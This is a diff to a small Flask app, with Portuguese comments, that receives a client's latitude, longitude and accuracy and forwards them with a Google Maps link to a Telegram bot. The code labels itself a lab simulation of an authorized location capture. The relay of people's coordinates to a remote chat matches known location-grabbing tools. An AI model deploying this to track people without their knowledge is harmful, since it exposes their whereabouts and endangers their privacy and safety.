@@ -1,16 +1,13 @@
 from flask import Flask, request, jsonify, render_template
 from datetime import datetime, timezone
-import json
 import uuid
 import os
-from pathlib import Path
 
 import requests
 
 
 app = Flask(__name__)
 
-LOG = Path("locations.jsonl")
 
 # Variáveis configuradas no Vercel
 TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
@@ -34,23 +31,15 @@ def location():
     maps_url = None
 
     if latitude is not None and longitude is not None:
-        maps_url = f"https://www.google.com/maps?q={latitude},{longitude}"
-
-    record = {
-        "id": str(uuid.uuid4()),
-        "received_at": datetime.now(timezone.utc).isoformat(),
-        "latitude": latitude,
-        "longitude": longitude,
-        "accuracy_m": accuracy,
-        "client_timestamp": data.get("timestamp"),
-        "maps_url": maps_url
-    }
-
-    # Registro local para o laboratório
-    with LOG.open("a", encoding="utf-8") as f:
-        f.write(
-            json.dumps(record, ensure_ascii=False) + "\n"
+        maps_url = (
+            f"https://www.google.com/maps"
+            f"?q={latitude},{longitude}"
         )
+
+    # Identificador da solicitação
+    record_id = str(uuid.uuid4())
+
+    received_at = datetime.now(timezone.utc).isoformat()
 
     # Envia a localização autorizada para o Telegram
     if (
@@ -66,6 +55,8 @@ def location():
 
         message = (
             "📍 Localização recebida — SIMULAÇÃO\n\n"
+            f"ID: {record_id}\n"
+            f"Recebido em: {received_at}\n\n"
             f"Latitude: {latitude}\n"
             f"Longitude: {longitude}\n"
             f"Precisão: {accuracy} m\n\n"
@@ -90,10 +81,14 @@ def location():
                 f"Erro ao enviar localização para o Telegram: {error}"
             )
 
-    # Retorna o link do Google Maps
+            return jsonify({
+                "ok": False,
+                "error": "Falha ao enviar localização para o Telegram."
+            }), 502
+
     return jsonify({
         "ok": True,
-        "id": record["id"],
+        "id": record_id,
         "maps_url": maps_url
     })
 
